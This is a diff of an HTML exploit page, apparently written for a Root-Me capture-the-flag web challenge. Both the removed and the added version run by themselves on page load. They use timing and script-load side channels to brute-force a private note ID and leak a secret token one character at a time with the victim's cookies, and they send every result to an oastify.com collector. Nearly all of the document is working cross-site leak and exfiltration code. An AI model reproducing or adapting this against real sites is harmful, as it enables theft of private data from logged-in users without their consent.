@@ -1,122 +1,147 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="utf-8">
-    <title>Automated XS-Leak ID Finder & Extractor</title>
-</head>
-<body>
-    <h1>Processing safe content rendering...</h1>
-    <pre id="status" style="font-family: monospace; color: blue;">Initializing session...</pre>
-
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Document</title>
+    </head>
+    <body>
+        <iframe id="ff" frameborder="0"></iframe>
+    </body>
     <script>
-        const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056";
-        const COLLECTOR = "http://d3hf8gt505zvmoc493wglh73wu2lqbe0.oastify.com/?flag=";
-        const alphabet = "abcdefghijklmnopqrstuvwxyz0123456789_-{}";
-        
-        const sleep = ms => new Promise(res => setTimeout(res, ms));
+        // prettier-ignore
+        const ALPHABET_UPPER = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"];
+        const ALPHABET_LOWER = ALPHABET_UPPER.map((c) => c.toLowerCase());
+        const NUMBERS = [...Array(10).keys()];
+        const CHAR_LIST = [
+            ...ALPHABET_LOWER,
+            ...ALPHABET_UPPER,
+            ...NUMBERS,
+            "&",
+            "é",
+            '"',
+            "'",
+            "(",
+            "-",
+            "è",
+            "_",
+            "ç",
+            "à",
+            ")",
+            "=",
+            "~",
+            "#",
+            "{",
+            "[",
+            "|",
+            "`",
+            "\\",
+            "^",
+            "@",
+            "]",
+            "}",
+            ",",
+            ";",
+            ":",
+            "!",
+            "?",
+            ".",
+            "/",
+            "§",
+            "^",
+            "¨",
+            "$",
+            "£",
+            "€",
+            "ù",
+            "%",
+            "*",
+            "µ",
+            "°",
+            "¤",
+            "<",
+            ">",
+            "²",
+            "+",
+        ].map(encodeURIComponent);
 
-        function ui(text) {
-            document.getElementById("status").textContent += "\n" + text;
-        }
+        let baseUrl =
+            "https://web-client-ch56.challenge01.root-me.org:58056/notes/";
 
-        // Send data back to your collector
-        function notify(event, message) {
-            try {
-                const img = new Image();
-                img.referrerPolicy = "no-referrer";
-                img.src = `${COLLECTOR}?ev=${encodeURIComponent(event)}&msg=${encodeURIComponent(message)}&t=${Date.now()}`;
-            } catch (_) {}
-        }
+        const endpoint = "http://d3hf8gt505zvmoc493wglh73wu2lqbe0.oastify.com/";
 
-        // Timing probe function using fetch (no-cors)
-        async function probe(path) {
-            const url = `${TARGET}/${path}`;
-            const t0 = performance.now();
-            try {
-                await fetch(url, {
-                    mode: "no-cors",
-                    credentials: "include",
-                    cache: "no-store"
+        let c = 0;
+        let id = 392;
+        let token = encodeURIComponent("zc4r3_4b0ut_+s4mes1t3_c");
+        let isSearching = true;
+
+        const findId = async () => {
+            const loopPromise = () =>
+                new Promise((resolve) => {
+                    const sss = document.createElement("script");
+                    sss.onload = () => {
+                        isSearching = false;
+                        document.body.removeChild(sss);
+                        resolve();
+                    };
+                    sss.onerror = () => {
+                        id += 1;
+                        document.body.removeChild(sss);
+                        resolve();
+                    };
+                    sss.src = baseUrl + id;
+                    document.body.appendChild(sss);
                 });
-            } catch (_) {}
-            return performance.now() - t0;
-        }
 
-        async function startExploit() {
-            ui("Starting exploit... Verifying collector connection.");
-            notify("status", "Bot started execution");
-
-            // --- STEP 1: Find the Baseline (Using a non-existent ID) ---
-            ui("Calculating baseline timing for non-existent resource...");
-            let baselineSum = 0;
-            for (let i = 0; i < 3; i++) {
-                baselineSum += await probe("notes/999999/not_found_test");
-                await sleep(200);
-            }
-            const baseline = baselineSum / 3;
-            const threshold = baseline + 1200; // Look for a significant delay (~1.2s or more)
-            ui(`Baseline: ${Math.round(baseline)}ms | Target Threshold: >${Math.round(threshold)}ms`);
-
-            // --- STEP 2: Brute-force the Note ID ---
-            ui("Scanning for valid admin note ID...");
-            let activeNoteId = null;
-            
-            // Define the ranges to check. Try low IDs first, then around your own ID.
-            const candidateIds = [1, 2, 3, 4, 5, 392, 329, 427]; 
-            
-            for (let id of candidateIds) {
-                ui(`Testing Note ID: ${id}`);
-                // Probe the root of that note ID
-                const dt = await probe(`notes/${id}/`);
-                
-                if (dt > threshold) {
-                    activeNoteId = id;
-                    ui(`[!] MATCH FOUND: Note ID ${id} responded in ${Math.round(dt)}ms`);
-                    notify("id_found", `Successfully targeted ID: ${id}`);
-                    break;
-                }
-                await sleep(300);
-            }
-
-            if (!activeNoteId) {
-                ui("[-] Failed to automatically determine the Note ID. Defaulting to 1.");
-                activeNoteId = 1;
-            }
-
-            // --- STEP 3: Leak the Note Title ---
-            ui(`Beginning character exfiltration on Note ID: ${activeNoteId}`);
-            let currentFlag = "";
-            let cracking = true;
-
-            while (cracking) {
-                let foundCharInThisRound = false;
-
-                for (let char of alphabet) {
-                    let candidateString = currentFlag + char;
-                    ui(`Trying: ${candidateString}`);
-                    
-                    const dt = await probe(`notes/${activeNoteId}/${encodeURIComponent(candidateString)}`);
-                    
-                    if (dt > threshold) {
-                        currentFlag += char;
-                        foundCharInThisRound = true;
-                        ui(`[+] Hit found: ${currentFlag} (${Math.round(dt)}ms)`);
-                        notify("hit", currentFlag);
-                        await sleep(500); 
-                        break; 
-                    }
-                    await sleep(150); 
-                }
-
-                if (!foundCharInThisRound) {
-                    ui(`[=] Extraction finished. Final Value: ${currentFlag}`);
-                    notify("final_flag", currentFlag);
-                    cracking = false;
+            while (isSearching) {
+                await loopPromise();
+                if (id % 100 === 0) {
+                    fetch(endpoint + "?passed=" + id);
                 }
             }
-        }
 
-        window.onload = () => { setTimeout(startExploit, 500); };
+            isSearching = true;
+            fetch(endpoint + "?id=" + id);
+            baseUrl = baseUrl + id + "/";
+        };
+
+        const findToken = async () => {
+            const loopPromise = () =>
+                new Promise((resolve) => {
+                    const start = performance.now();
+                    ff.onload = () => {
+                        const timing = performance.now() - start;
+                        if (
+                            timing < 1000 ||
+                            (token + CHAR_LIST[c]).startsWith("f")
+                        ) {
+                            // not found
+                            c += 1;
+                            if (c === CHAR_LIST.length) {
+                                isSearching = false;
+                            }
+                        } else {
+                            // found
+                            token += CHAR_LIST[c];
+                            c = 0;
+                            fetch(endpoint + "?search=" + token);
+                        }
+                        resolve();
+                    };
+                    ff.src = baseUrl + token + CHAR_LIST[c];
+                });
+
+            while (isSearching) {
+                await loopPromise();
+            }
+
+            fetch(endpoint + "?done=" + token);
+        };
+
+        const main = async () => {
+            await findId();
+            await findToken();
+        };
+        main();
     </script>
-</body>
 </html>
